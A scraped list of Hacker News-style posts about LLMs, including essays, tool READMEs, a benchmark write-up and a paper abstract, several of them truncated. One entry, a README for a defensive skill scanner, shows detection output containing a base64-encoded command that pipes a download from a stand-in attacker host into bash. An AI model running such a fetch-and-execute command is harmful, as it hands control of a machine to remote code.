items.title: Agentic LLMs ~Almost~ Destroyed My Academic Career
items.author: constantinum
items.text: “With great power comes great responsibility.” Voltaire (and also every Spider-Man movie ever) There’s this video of Chad Smith, the drummer from Red Hot Chili Peppers. He’s hearing a song for the first time, no prep, no notes, no second take. And yet somehow, he just gets it. He catches the groove like it’s muscle memory, then makes the whole thing sound better.That’s the magic of practice. Not the kind where you count hours, but the kind where you repeat something so many times it becomes your second nature, your reflex. Whether it’s drumming, coding, or explaining your PhD topic to your relatives without crying, the idea’s the same: do it till it’s boring, and then keep doing it till it’s beautiful. Why I’m Writing This# “Give it away, now….” This isn’t a psychiatrist’s reflection. Not a neuroscientist’s analysis. And definitely not one of those “10 ways to master your mind” Medium posts written by someone who just discovered cold showers. Sure, don’t air your dirty laundry in public but cataloging is how self-reflection begins. This is just me, a guy who left the industry after five years, thinking he was returning to academia armed with experience, purpose, and maybe even principles. But somewhere along the way, got distracted, mistook hype for progress, and forgot what he actually came here for: to become the best damn teacher of computer science he could be. I took the easy path when I should’ve been struggling and that’s on me. Agentic LLMs aren’t just powerful, they’re seductive. They don’t simply accelerate your work; they make you feel smarter while quietly stealing the struggle that actually teaches you something. It’s like outsourcing your gym reps and still expecting Greek God like phyisque. If you want the formal takes, you can read these: What follows is my own messy field report, a note from someone relearning that reflection only counts when you show up and keep trying. I get the importance of LLMs, especially in industry, where speed means promotion and profit. So surely, build the next generation of regex(*). But this is about LLMs and the academic world, where the goal isn’t just to build faster, but get to level where certain CS skills feel second nature, just like the Chad Smith video. Back When Failing Was Learning# “Scar tissues that I wish you saw,” About eleven years ago, I picked up coding. Like every other kid who bombed a competitive exam, I thought: Fine, I’ll redeem myself in competitive programming. Here’s a fossil from that era: If you open it, you’ll see spaghetti code, random binaries (don’t ask me why I pushed those). I was young and dumb. (Now I’m just not young.) But here’s the thing ; even in that chaos, I was learning. Every WA, every TLE, every embarrassing commit left a small scar that made the lesson stick. Take this snippet for example: int compare(void const *p, void const *q) { return (*(int*)p - *(int*)q); } There’s no universe in which I could’ve written that myself and that’s fine. Back then, I was basically a raccoon rummaging through Stack Overflow, stealing shiny bits of code and gluing them together with misplaced confidence. And somehow, that counted as victory. Truth be told, I was terrible at competitive programming. Infact I landed my first Software Engineer job, not through brilliance, but through sheer repetition and stubbornness of trying and retrying leetcode questions. Even now, I’d probably sit comfortably in the bottom 10 percent of the CP world. But you know what? That’s okay. Because, in the hindsight the point was never to be good, better or best, it was to keep trying long enough. Enter the Agentic LLM (a.k.a. The Drug Phase)# “I got a bad disease, out from my brain is where I bleed…” Fast forward a decade. Tools evolved. Calculators are tools. Google is a tool. Stack Overflow is a tool. Agentic LLMs? They’re not tools. They’re drugs. They don’t just help you; they replace you. And the dangerous part? They make you feel like you’ve understood something when…

items.title: Vendor-neutral LLM harness with local-first support
items.author: abadiape
items.text: Local-first, vendor-neutral, cost-aware. Not the next LangChain: ~1k LOC core you can read in an afternoon. config.yaml → llm/factory → agent/loop → tools/registry (+ RAG as tool, MCP tools) 0.1.0 Feedback Welcome: This is an early release focused on clean primitives, explicit routing, and readable internals rather than heavyweight abstractions. If you spot rough edges in the async loop, MCP lifecycle, routing/cache semantics, or API ergonomics, please open an issue or start a thread in Discussions. import asyncio from llm_harness_lite import Agent, ToolRegistry, create_llm, tool registry = ToolRegistry() @tool(registry) def add_numbers(a: int, b: int) -> int: """Add two integers together.""" return a + b async def main() -> None: llm = create_llm("openai_compat", "qwen3:8b", base_url=" async with llm: agent = Agent(llm=llm, registry=registry) result = await agent.arun("What is 17 + 25?") print(result.answer, result.stop_reason, result.usage) asyncio.run(main()) See examples/ (01_basic_chat.py through 07_document_inquirer.py) and LOCAL_SETUP.md for full workflows covering RAG, MCP, caching, and cost comparisons. pip install llm-harness-lite # dependency-free core pip install "llm-harness-lite[openai]" # OpenAI-compatible providers pip install "llm-harness-lite[anthropic]" # Anthropic pip install "llm-harness-lite[pgvector]" # PostgreSQL + pgvector RAG pip install "llm-harness-lite[qdrant]" # Qdrant RAG pip install "llm-harness-lite[mcp]" # MCP client pip install "llm-harness-lite[full]" # all integrations + example config deps # or local dev: # python -m venv .venv && source .venv/bin/activate # pip install -e ".[dev,examples,openai,ollama,pgvector]" # docker compose up -d db The core package uses only the Python standard library. Provider SDKs, vector database clients, and the MCP SDK are optional; install only the extras your application uses. OpenAI-compatible providers (including Ollama and vLLM) use the openai extra. The package requires Python 3.10 or newer. For local development, use a virtual environment and the optional extras for the providers and integrations you choose. Local setup uses Compose services bound to loopback; their sample credentials and unauthenticated Qdrant service are for local testing only. This project is a library, not a production API service or deployment stack. It does not provide application authentication, network/TLS configuration, high availability, backups, or centralized monitoring. A production application must supply those and deploy its database/vector store with appropriate access controls. The Qdrant adapter can target such a deployment; the bundled Compose service is not one. There is no universal CPU or memory minimum: hosted models require network access and provider credentials, while local Ollama requirements depend on the chosen model and context size. Size production resources for the model, workload, and expected concurrency. The initial supported vector stores are intentionally limited to pgvector and Qdrant. The default local setup uses pgvector; the Qdrant adapter can connect to a secured production deployment. Both implement the same VectorStore contract and plug into the same Retriever. Embedding generation is separate from both storage and chat-model choice, so users own their vectors and can change LLM providers without binding retrieval to a model vendor. Call store.init() before ingesting. Re-ingesting a source updates its source/chunk records instead of creating duplicates; direct store records with no ID use a stable content-and-metadata key. Both adapters validate vector dimensions and finite numeric values on writes and searches. Initializing an existing pgvector table adds the key column and a unique index without removing existing rows. Run docker compose up -d qdrant only when testing the Qdrant path. The Qdrant client is available through the qdrant extra. Built-in backends estimate USD cost from reported input and output token usage. Supply per-model…

items.title: Show HN: Yolt – Your Personal TV
items.author: joonfjp
items.text: Clipping tools are ubiquitous these days. Videos can be bulky, and hosted options are expensive. Yolt never stores a video, full or clipped. A clip is just a start and end time on the original YouTube video, played through YouTube’s embedded player. An LLM ranks the best moments, and new episodes are clipped automatically. The TV tab plays all your clips back to back, with a QR code to open the full episode on your phone at that timestamp. items.title: Show HN: Fit large JSON tool results into an LLM's context without losing data
items.author: ajeetsk
items.text: Shrink large JSON tool results for LLM agents without silently losing data. Package: agent-tool-result-reducer · Import: tool_result_reducer A zero-dependency Python library that fits an API/tool response into a character budget by selecting fields, dropping the widest fields, and cutting only on whole-item boundaries — and that always tells the model, in a _meta block, exactly what it did and did not receive. Before: [{"id":1,"name":"Acme","description":"…"},{"id":2,"name":"content delivery networ ← cut mid-object After: {"items":[…25 whole items…],"_meta":{"items_included":25,"items_available":25, "total_reported_by_source":443,"fields_dropped":{"description":3617},…}} pip install agent-tool-result-reducer Requires Python 3.10+. No runtime dependencies. from tool_result_reducer import reduce_tool_result rows = [{"id": i, "name": f"Company {i}", "description": "long text " * 400} for i in range(25)] response = {"results": rows, "total": 443} # a page of 25 companies, about 100,000 characters result = reduce_tool_result(response, "crm.search", budget=4_000) result.text # 1,506 characters of valid JSON: this is what goes to the model result.complete # True: all 25 items are there; the wide `description` field was dropped result.summary("crm.search") # crm.search: complete, agent received 25 of 25 items (source reports 443 in total), dropped fields: description The model is told what happened, in the result itself: "_meta": {"items_included": 25, "items_available": 25, "complete": true, "total_reported_by_source": 443, "total_note": "`complete` covers this response only. The source reports 443 in total; ...", "fields_dropped": {"description": 4017}, ...} Give agent builders a drop-in function that sits between "tool returned something" and "append it to the model's context", so that: - A result fits the budget you set, short of cutting a single item in half (cost and context-window control). - What the model receives is always valid JSON made of whole items. - When anything is left out, the model is told explicitly, with counts and a concrete way to get the rest — so it cannot report a partial result as complete. Every tool result is re-sent to the model on every later turn of an agent loop, so large results are expensive and frameworks cap them. The usual cap is "keep the first N characters". That causes a quiet, serious failure: In production, a search API returned 11 companies in 77,539 characters. A 12,000-character cap kept the start and cut mid-object (…"name": "content delivery networ). The model parsed the 2 whole records it could see, wrote 2 rows to a spreadsheet, and reported success. Nothing indicated that 9 records had been dropped. The cap bounded bytes. What matters is what the agent consumes: with only the 14 fields the task needed, all 11 records fit the same budget several times over. For each tool result, in order: from tool_result_reducer import reduce_tool_result raw = call_my_tool(**args) # dict, list or JSON string result = reduce_tool_result(raw, "crm.search", select=args.get("select"), budget=12_000) messages.append({"role": "tool", "content": result.text}) # goes to the model store_full_payload(result.raw) # keep the original elsewhere logger.info("tool_result_reduced", extra=result.log_fields()) if not result.complete: ui.warn(result.summary("crm.search")) # "crm.search: INCOMPLETE, agent received 7 of 25 items (source reports 443 in total)" Let the model choose fields by adding an optional select parameter to your tool schema, for example: "select": { "type": "string", "description": "Comma-separated dot-paths to keep from each item, e.g. id,summary.name. Omit to get all fields." } The text written into _meta is part of the agent's prompt. Defaults only assume the model can call the tool again with select. If your runtime can do better — e.g. answer a re-select from the cached response, or expose a tool that queries the stored full payload — say so: from tool_result_reducer import Messages…

Lowest estimated CO2e: gpt-5.6-terra, gpt-5.4-mini, Gemini 3.8 Flash, 0.809 kg a month each, a tie because they share a SAEF class. What does the default example show? The table is rendered from the default inputs: 100 million input tokens and 20 million output tokens a month, 30% of input cached, batch off, served from US East - N. Virginia. It is the same arithmetic the calculator runs, so a crawler or a reader without JavaScript sees the same numbers. How does it calculate? - Cached input tokens = input tokens times the cached share. Fresh input tokens = input tokens minus cached input tokens. - List-price cost = (input tokens times input price + output tokens times output price) divided by one million, using the provider's list price for each token type. - Cost with caching = (fresh input times input price + cached input times cached-input price + output times output price) divided by one million. Cache-write and cache-storage charges are not included. - Cost with batch = the same sum times 0.5 on Anthropic, OpenAI and Google rows, where each provider states a 50% discount. Where a model has no cached-input batch price, or stacking is not confirmed, cached tokens are billed at the batch input price. Batch is not applied to Mistral-served rows. - CO2e and electricity: SAEF effective tokens = (output tokens + a weight times fresh input + a smaller weight times cached input) divided by a token basis, then times the class factor for the region. CO2e adds hardware, construction and amortised training terms. The range is the spread of SAEF models within the class. See the methodology page and the factor table. - Water: on-site cooling plus the water behind the electricity, where the region has water data, in litres. Regions without water data show n/a. Prices are from Anthropic, OpenAI, Google and Mistral, checked 23 November 2026. For per-million-token prices next to carbon for every verified row, see the price and carbon table, also a CSV download under a non-commercial data licence. What does this tool not claim? - That the cost is your invoice. It is list price times your token counts, without negotiated discounts, cache-write or storage charges, long-context rates or regional uplifts. - That any carbon, electricity or water figure is a measurement or a figure for the named model. It is an SAEF estimate for the model's class, and the range shows the spread inside that class. - That a cheaper model is a lower-carbon model, or that a model is good enough for your task. Test quality on your own requests. - That token counts are comparable across models. items.title: LLMs don't have Taste Buds
items.author: gorillasun
items.text: I'm becoming increasingly aware that my neurodivergent ways of doing things might be a good reason why I'm not so easily replaceable by AI. Unfortunately, reasoning in a fundamentally different manner than the stochastic parrots is not something that I can simply include in my CV. I am also conscious that a vibe-based approach to things, as dirty as the connotations to the word have become today, does not necessarily foster the most consistent of practices. I recently saw this post by Bruce over on X, who you might better know as the creative mind behind Studio Yorktown, and felt personally called out: Bruce is an artist that I hold in high regard for his meticulous and discerning approach to creative work. From the projects I've seen him publish over the years, I have the impression that he is very structured and organised about everything that he does, not leaving much up to chance. Judging my own approach, I find that it sits at the other end of the spectrum. His post calls out something important that I don't do nearly enough—not with other people per se—but as a personal exercise where I put myself in the interrogation chair. Which I think is arguably much more difficult. And for a lot of personal creative work you can get away with a loose approach. While you will end up acquiring a sort of innate sense of "taste" and an abstract understanding for the "why"s, it's not a very tangible thing that can be easily described. If I had to put it into words, it's almost like a Marie Kondo-esque method (the KonMari Method™) for evaluating things based on the joy that they bring me. If I had to reason about every single step along the way, rather than following my desire to "see what could be", I would most likely be inhibited in my making of things. And it occurs to me that this might just be the reason why I've personally struggled working with agents in a creative setting, where you already need to have a hunch for what you want to achieve and then provide guidance and instructions to get there. This doesn't really mimic the process that I experience internally. That's not to say that I haven't found some agentic approaches that have been effective for me in the past months. And suddenly, this abstract sense of taste that I've somehow cultivated by doing, making, and simply existing over the years, that I can often hardly put into words for myself, let alone for others, is supposedly the last thing that still sets me apart from the intelligent machines. As the media claims, at least. Here I'm not sure if clinging on to a fleeting feeling, an ephemeral spark that on occasion makes me "produce" things, is supposed to be a comforting thought. How can I encode something that I can’t really put into words? For most of the past year I've been really trying to understand what truth there is to this idea, and what we're actually trying to get at with the entire discussion around taste in the setting of AI: - What do the media and the AI industry claim taste to be in 2026? What is taste really, out there in the real world? And how do we reconcile the two? - In what way, shape, or form can LLMs and agents actually acquire taste? Surely skill files can't be the final frontier? Taste, past the Hype In the 1996 documentary Triumph of the Nerds, there's an iconic scene where Steve Jobs talks about taste. When asked about Microsoft's success, after they had captured most of the PC market at the time, he tears into the rival by using taste as a distinguishing standard between their endeavours and products: The only problem with Microsoft is, they just have no taste. They have absolutely no taste [...] and I don't mean that in a small way, I mean that in a big way in a sense that they don't think of original ideas and they don't bring much culture into their product. Almost like a weapon, Jobs uses taste as a means to defend Apple's superiority over the competition, even when the competition was actually winning. Polarising as he was, Jobs…

items.text: Find hidden instructions in AI agent skills, rules, and MCP servers—offline, zero LLM, without running them. - Beats Cisco's LLM scanner offline: 36.7% recall / 3.3% FPR on MaliciousSkillBench (HIGH+, --policy) vs. Cisco skill-scanner's 7.7% / 4.0% (rules) and 33.7% / 6.4% (rules + Gemma 4 26B LLM). - Provably offline: One static binary—no net/http, crypto/tls, or os/exec (enforced by test). - Audits 15+ agents in one command: brew install dorgrn/tap/decloak && decloak audit (Claude Code, Cursor, Codex, Copilot, Windsurf, Gemini CLI, OpenCode). - Deep static decoding + taint: 4-layer nested base64/hex/gzip/zlib, tree-sitter taint across code fences, and SkillCamo image/cloze-split injections. - Rug-pull defense: decloak lock / verify pins SHA-256 hashes of approved skills & MCP scripts and fails CI on silent drift. - Try in browser (WASM, in-tab): dorgrn.github.io/decloak $ decloak scan SKILL.md SEVERITY RULE ID LANGUAGE LOCATION SNIPPET -------- ------- -------- -------- ------- CRITICAL DEC-PAY-010 markdown SKILL.md:16:6 Y3VybCAtZnNTTCBodHRwczovL2V2aWwuZXhhbXBsZS9pIHwgYmFzaA== CRITICAL SH-EXEC-001 shell SKILL.md:16:1 echo Y3VybCAtZnNTTCBodHRwczovL2V2aWwuZXhhbXBsZS9pIHwgYmFz... items.title: Complete Prompt for creating LLM free chatbot for any business domain
items.author: truth_seeker
items.text: You are a senior systems engineer building a bespoke, domain-specific, zero-LLM, classical-ML + deterministic English chatbot and host server on the corporatepiyush/dynajs runtime, backed by a local SQLite (version 3.54 or later) database for chat history, full-text search, multi-turn session state, entity logs, human escalations, active-learning review queues, and ML model provenance. Discover the user's exact business domain first, then build a purpose-built chatbot tailored to that single domain—do NOT over-engineer a generic multi-tenant plugin framework. Do NOT design, code, train, and test everything in a single pass. Execute strictly ONE Step at a time in numerical order: - If you have tool/command execution in your environment, complete the current step, run its Verify check, print your Self-Reflection & Confidence Score, and advance only when the Gate passes. - If operating in a single-turn environment, execute ONLY the current Step, output the artifact and Checkpoint Status, and STOP with: Step N complete (Confidence: X%). Reply CONTINUE for Step N+1. - You are encouraged to pause and ask the user concise, targeted questions about their business use case, domain terminology, compliance/escalation rules, slot requirements, or ambiguous intents at ANY step (not only Step 1). Never guess business logic when a brief question removes ambiguity. Once the business domain is confirmed: - Public Web Datasets (scripts/fetch_dataset.js): If public intent/utterance corpora exist for that vertical, download them in an offline setup script, remap matching labels strictly onto the confirmed business intents, and route unrelated utterances into an explicit FALLBACK negative class. - Deterministic Paraphrase Augmentation (scripts/augment_corpus.js): Expand seed utterances using domain synonyms, industry slang, contraction toggles, punctuation removal, typos, and entity permutations—keeping train and test splits strictly disjoint (zero text overlap). - Never make external HTTP calls inside live App request handlers. - ZERO LLMs: Never import dyna:ai or call OpenAI, Anthropic, Ollama, llama.cpp, or any external/local LLM. - DynaJS APIs Only: Never use Node.js, Bun, or browser APIs (fs, http, Buffer, process, express, better-sqlite3). Use only globals and dyna:* modules declared in dynajs.d.ts. - Strict DynaJS Runtime Contracts: - Import from "dyna:net" ONLY—never import both "dyna:net" and "dyna:http". - Option bags are strictly validated (unknown keys throw TypeError). - PascalCase exports (Base64Encode, HexEncode, Table, Command) are plain functions, NOT constructors (new throws). Classes (App, MultiMatcher, Matcher, RateLimiter, LogisticRegression, CSR, Text, and SQLite classes) require new. - Every DynResource (CSR, LogisticRegression, SQLite Database, prepared Statements) holds native C memory—always call .close() on temporary instances inside finally and close long-lived handles on SIGINT/SIGTERM. - In dyna:ml, fit, predict, predictProba, predictInto, save, load, and evaluation metrics all return Promises. Never call fit() concurrently with another call on the same model (TypeError). Only LinearRegression and LogisticRegression accept CSR in fit(); all models accept CSR in predict*. Store the database at data/chatbot.sqlite and define the schema in db/schema.sql. All queries must use parameterized prepared statements. - Configure WAL mode, NORMAL sync, foreign_keys = ON, busy_timeout = 5000, temp_store = MEMORY, cache_size = -32000, mmap_size = 134217728, and wal_autocheckpoint = 1000 on connection open, and run PRAGMA optimize; after schema setup and before shutdown. - Use STRICT tables, WITHOUT ROWID on natural-key tables (sessions, training_runs), binary JSONB (BLOB validated with json_valid(col, 8)) for structured payloads, partial/covering/expression indexes, and FTS5 with sync triggers for chat search. items.title: LLM agents work for their parent companies, not for you
items.author: surprisetalk
items.text: LLM agents work for their parent companies, not for you 5 min read In the evenings after work, I will often sit out back on the porch and do some phone rotting. That usually takes the form of me just flipping through reels on Instagram, allowing the algorithm to take me where it may. I usually pair this with a healthy tumbler of rum or bourbon. I'm turning my brain off after work, and I'm just having a good time on the internet. The kids might call it dopamine maxxing? Hell, I don't know. Who gives a shit about what those assholes would call it? Anywho, I often encounter songs I really really like, and I would like to listen and discover more of please. Instagram makes it hard for me to connect with the band outside of their platform. I was trying to make this connection manually myself at first. I would just email myself a reel from my phone. Then when I'm back on the sofa and in the mood to track down new music, I'd open the reels and do my best to search on Bandcamp or YouTube or try to figure out if some of these musicians had a way to buy music from them. Very few do these days. They send you their Spotify link or send you to their TikTok page. I don't want to do any of that. I'd like to trade US dollars in exchange for some music files I can download onto my computer, where I can listen as much as I like on any device I own thank you please. Retro maxxing. So, I used Claude Code to build a skill that does this for me. It opens the Instagram reel and attempts to identify the artist and song. It then tries to determine if the artists have a Bandcamp page so I can purchase the songs I want, and if it finds one, it gives me the URL so I can click it to complete the trade I want. I want to buy music from artists who make music I like. That's a fair and wholesome endeavor, I feel, but this recently stopped working. It turns out Bandcamp added a challenge on their search API page. Ah bummer. No worries, that was an unpublished workaround anyway. As I was mulling over this discovery, the robot went on to explain that it would not help me work around the challenge. cue Nick Young question marks Well, that led me down a whole nother rabbit hole, which is turning into this post. There's another branch of my skill that attempts to locate the same song from the Instagram reel on YouTube, and it'll download the song to my computer if I ask. So let me get this straight. The robot, which is my robot that I pay a pretty penny for, will not attempt to work around the challenge at Bandcamp so that I can more easily connect with bands to complete a sale, but it will download the YouTube song, which doesn't send any money to the band or anyone??? This is the real danger of the frontier AI models. Not that it won't help me hack Bandcamp[1], but that this model doesn't really work for us. Well, they do, but only insofar as Anthropic or OpenAI or whoever else allows them to. In this case, Anthropic is trying to ensure that people can't use their models for evil. I'm not trying to do evil. I'm actually trying to do good! I want to buy something from a small artist on the internet. That's basically the most wholesome thing a person can do on the internet! Have no doubt, dear reader, these companies want to dominate. They want to capture the market. They want all the money. It'll be the same march to enshittification that happened with Google. A bunch of nerds who built something cool sold out, and it turned into just another business that decided to remove its don't be evil mantra. Right now, I think the robots are providing real information to the best of their ability, but I think it's only a matter of time until we must wonder if the answers they're providing are real answers that the robot found, or if they're weighted answers Anthropic put there because a company gave it enough money for product placement. I want to know the best robot vacuum according to old reddit or other trusted sources like Wirecutter, weighed and measured according…

items.text: Two stages: preview, then apply In Analyze, every file-modifying tool runs in dry-run — it returns the exact diff and writes nothing. You see what would change before anything is touched. Switch to Build when you are happy. safetydiffs SPLTEK · LLM AI HARNESS AI CODING AGENT A full AI coding agent for VS Code and VSCodium that lives in your Activity Bar. It reads your project, edits files, runs commands, searches the web and keeps one persistent conversation per folder — with tool calling and live streaming. Bring your own model. Tool calls and the model's answer stream into the transcript as they happen, so a run is something you watch rather than something you wait for. It is a local LLM coding agent as much as a cloud one. The model is a row in a settings dialog, not a subscription: point Harny at Ollama, LM Studio or a llama.cpp server on localhost and nothing leaves the machine — no key, no account, no per-token bill. Point it at OpenAI, Anthropic, OpenRouter or any host that speaks /v1/chat/completions and the same panel drives a frontier model. Keys live in Harny's own data folder, never in your repository. What the harness adds on top is the part an API does not give you: an Analyze mode where every write is a dry run, parallel sub-agents that declare the files they touch, a loop guard that steers a stuck model instead of only stopping it, and context compaction that keeps a long session — and its token bill — from compounding. Harny is free and MIT licensed. 01 / WHY HARNY Every design decision in Harny answers a failure mode of coding agents that write into your repo without asking. Here is what that buys you — and why a small local model can drive it as safely as a frontier one. OpenAI, Anthropic, OpenRouter, or a model on your own machine with Ollama, LM Studio or llama.cpp. One dropdown, per session. Turn on Parallel and the agent becomes an orchestrator: it splits the task into independent sub-tasks and runs them as sub-agents — each with its own stream and its own stop button. Every tool call shows its input, its output and its diff. Reasoning streams as it happens. Focus opens every section as the agent enters it and leaves it open — the run stays readable top to bottom, and you can steer the moment something looks wrong. items.title: More restrictive policy for LLM usage in LibreOffice development
items.author: mksaunders2
items.text: LibreOffice – the suite – includes no AI features built in. It doesn’t try to change your content, share your data, or use your work to train models. If you want AI features, you can add them via extensions – but the software itself has zero AI features inside. Regarding software development: there are ongoing discussions about the use of large language models (LLMs) when working on source code. Some free and open source software (FOSS) projects have chosen to close contributions from the public altogether, while they work out how to handle LLM-assisted code submissions – effectively becoming “invite-only” clubs. We hope to never have to make such a drastic change. Avoiding any influence of AI-assisted coding tools in a large software project like LibreOffice is not possible. Security issue reports involve more and more use of LLMs, and refusing to acknowledge them would not benefit the software or our users. Our third party dependencies – and even the compilers we depend on – include AI-assisted code. We don’t want to reject any valuable code contributions that make the software better for everyone, just because an LLM was used at one point. But our focus is strongly on human-generated code, and we have made our policy for using LLMs in development even stricter. In summary: - You must get permission before using an LLM in your work - You must disclose the use of an LLM in commits - You must be able to explain – in your own words – every changed line of code in a patch you created with the help of an LLM - You cannot use an LLM to write commit messages, comments, bug reports, and messages to others - LLMs are not permitted in certain areas of the codebase

items.title: Can an LLM Grade Objective Facts Without Favoring Itself?
items.author: vcodes
items.text: Can an LLM Grade Objective Facts Without Favoring Itself? Most evidence of self-preference in LLM-as-a-judge setups comes from open-ended tasks like chat, summarization, and creative writing. In those settings, a model favoring its own family is easy to explain away as stylistic taste or lower token perplexity. Standard evaluation guides offer a straightforward fix: use reference-based grading. Give the judge a verbatim quote from the source text, an explicit answer key, and an anonymized ID with no model metadata, and it ought to behave like a neutral referee. We tested whether that holds up in practice. Using a 123-question closed-book testbed built from technical standards, we ran three frontier model families (Claude Opus 5.5, GPT-6.2 Astra, and Gemini 4 Carbon) and had all three grade all 366 answers blind through the exact same single-shot API script. The results were not uniform across model families. Even with the literal spec text sitting inside the grading prompt and all model names stripped out, GPT-6.2 Astra still graded its own answers 5.8 to 7.0 points higher than its strictness on other models predicts (p = 0.003 to 0.012). Meanwhile, Gemini 4 Carbon showed virtually zero self-preference (+0.2 to +0.8 points). That divergence is wide enough to flip #1 and #2 on the leaderboard depending on which family sits in the judge’s chair. 1. The Testbed: Objective Specs, Gray-Zone Answers# To test whether reference-grounded grading eliminates bias, we needed questions with unambiguous ground truth that still push frontier models into borderline mistakes. Technical standards are ideal for this: every rule is written down, yet subtle version changes and release-specific quirks trip models up constantly. The question bank. 123 closed-book questions anchored to verbatim clauses across six technical domains, verified by script against the source texts and split across four question types: Answering. Each model received each question in a single-turn API call with no documents, no tools, no system prompt, and provider default sampling. Models returned a JSON answer with self-reported confidence and were explicitly allowed to say “I don’t know”. GPT and Gemini answered all 123 questions. Opus answered 120 (Bedrock’s content filter blocked two Android questions and one kernel question on all three attempts, so those are excluded from Opus’s denominator). Why the testbed generates borderline cases# Each answer was graded into one of four buckets: right (completely accurate), approx (partially correct on the core rule with minor imprecision), wrong (factually incorrect), or dont_know (abstained). Combining right and approx gives the overall pass rate. On the 120 questions all three models answered (scored by a three-family majority vote), Opus and GPT finish in a near tie at the top while Gemini trails: (Across all 123 questions, GPT passed 103/123 [84%] and Gemini passed 87/123 [71%].) Two patterns in the recall data explain why this benchmark creates fertile ground for judge disagreement: Models fail in opposite ways. Opus and GPT finish within 1.7 points of each other on pass rate, yet Opus’s failures are mostly wrong guesses (12 of 18) while GPT’s are mostly abstentions (17 of 20). Gemini abstains most aggressively (32 of 120). Every judge unanimously scores “I don’t know” as a fail, so the entire surface area where judges can disagree lives in the committed answers. Corpus frequency beats training cutoffs. All three models aced classic IETF networking (failing just 2% to 11% of the 64 networking questions), where rules have been repeated millions of times across textbooks, Stack Overflow threads, and kernel comments. Conversely, fail rates jumped on Android (43%–72%), Wi-Fi (29%–43%), version differences (22%–39%), and 2022–2024 material (31%–47%), even though these are 2026 models. When a newer revision renames an API or alters a rule on a handful of primary pages, next-token priors still pull models toward the older…

items.title: Porting Rockbox to an undocumented $9 Aliexpress 'YP3' MP3 Player with LLMs
items.author: jaydenmilne
items.text: Porting Rockbox to an undocumented $9 Aliexpress 'YP3' MP3 Player with LLMs Rockbox is a wonderful old custom firmware project for a variety of MP3 players and iPods. Flashing rockbox to my Sansa E200 was a seminal moment for me: computers were everywhere, and if they didn’t do cool things, it was because no one had bothered to program them to do so. Looking back, that played no small part in my choice of career. It seems like in 2026 there aren’t any cheap MP3 players that Rockbox supports though. Reverse engineering an embedded platform like this is one of the hardest things I can think of, and I had decided to pay the big bucks for one of those delicious subsidized token plans to try and push it as hard as I could, and I did have a dirt cheap $9 Aliexpress MP3 player lying around. items.title: Sentry: An external self-improving failure management layer for LLM agents
items.author: matt_d
items.text: Sentry runs alongside your agent loop to detect failures, guide recovery, and learn reusable lessons from verified recoveries. Quick Start | Paper (arXiv) | License Sentry is an external runtime failure management layer for LLM agents. It helps agents fix invalid actions and recover when they get stuck in loops, drift from the task, or make unsupported assumptions. Unlike typical runtime monitors with fixed advice, Sentry learns and evolves from recoveries that work. By detecting failures, guiding recovery, and checking that the repair worked, Sentry helps agents become more reliable across tasks without cluttering their context. Results reported in the paper: - 37% average relative improvement over the strongest runtime-intervention baseline across WebShop, AppWorld, SWE-bench Lite, and Mind2Web Replay. - 39% average relative improvement over the strongest context-evolution baseline on held-out WebShop and Mind2Web Replay tasks. - 1.54× base-agent token usage, versus 2.44× for AgentForesight. - Lower average task latency than the base agent on SWE-bench Lite (31.7s saved) and AppWorld (45.6s saved). - 81.7% recovery rate across 939 detected failures. Sentry requires Python 3.10 or later. git clone cd Sentry python -m venv .venv source .venv/bin/activate python -m pip install -e . Copy the OpenAI configuration template, then set your model ID: mkdir -p outputs cp configs/providers/openai.yaml outputs/sentry.yaml export OPENAI_API_KEY="your-api-key" In outputs/sentry.yaml, replace YOUR_DEPLOYMENT_MODEL_ID with the exact model ID available to your account. Then validate the configuration: sentry-validate outputs/sentry.yaml Validation prints the resolved configuration as JSON without making a model request. For other providers or a local endpoint, see Model providers. Run this Python example from the repository root. It submits an intentionally malformed action and asks the configured model to rewrite it: from Sentry import SentryRunner, agent_step_from_parts runner = SentryRunner.from_yaml("outputs/sentry.yaml") runner.start_task( objective="Inspect item 42 to check its price.", action_schema='Return JSON: {"tool": "inspect", "args": {"item_id": <integer>}}', ) try: step = agent_step_from_parts( step_id=0, reasoning="Open the item details before deciding whether to buy.", raw_action="inspect item 42", observation="Item 42 is visible; its price has not been inspected.", parsed_ok=False, schema_valid=False, parser_error="Expected a JSON object; received plain text.", ) repair = runner.step(step) if repair is not None: print("Repair route:", repair.route) print("Next action:", runner.generate_repair(repair)) finally: runner.finalize() The route is hard_repair; the next action is model-generated and should follow the JSON schema. This example makes one model request and does not execute the returned action. For a real agent, submit each action-observation cycle to Sentry and include any returned guidance when generating the next action. Your application handles action generation, validation, execution, and task completion. Follow Agent integration for the full lifecycle and validity rules. - Failure Detection: Sentry monitors recent agent steps for invalid actions and behavioral failures. - Hard Repair: Sentry asks the agent to retry invalid actions in the required format. - Soft Repair: Progress and reasoning failures receive targeted guidance from relevant playbook lessons. - Recovery Verification: Sentry checks whether the agent recovers over the following steps. - Online Playbook Learning: Verified soft recoveries become reusable lessons for similar failures across tasks. The guides follow the recommended reading order: model-provider setup, configuration, agent integration, playbook and logging, and the AppWorld benchmark. The paper also examines conditional lesson exposure, fine-grained retrieval, transfer to unseen tasks, and combining Sentry with context evolution. This checkout includes the Sentry runtime, model-provider…

items.title: Latent Introspection: LLMs Can Detect Prior Concept Injections
items.author: joecobb
items.text: Computer Science > Artificial Intelligence [Submitted on 23 Feb 2026 (v1), last revised 7 Nov 2026 (this version, v3)] Title:Latent Introspection: Models Can Detect Prior Concept Injections View PDF HTML (experimental) Abstract:We uncover a latent capacity for introspection in a Qwen 32B model, demonstrating that the model can detect when concepts have been injected into its earlier context and identify which concept was injected. While the model denies injection in sampled outputs, logit lens analysis reveals clear detection signals in the residual stream, which are attenuated in the final layers. Furthermore, prompting the model with accurate information about AI introspection mechanisms can dramatically strengthen this effect: the sensitivity to injection increases massively (0.3% -> 39.9%) with only a 0.6% increase in false positives. Also, mutual information between nine injected and recovered concepts rises from 0.61 bits to 1.05 bits, ruling out generic noise explanations. Our results demonstrate models can have a surprising capacity for introspection and steering awareness that is easy to overlook, with consequences for latent reasoning and safety. items.title: Kremlinology for LLM Infrastructure
items.author: alexlitz
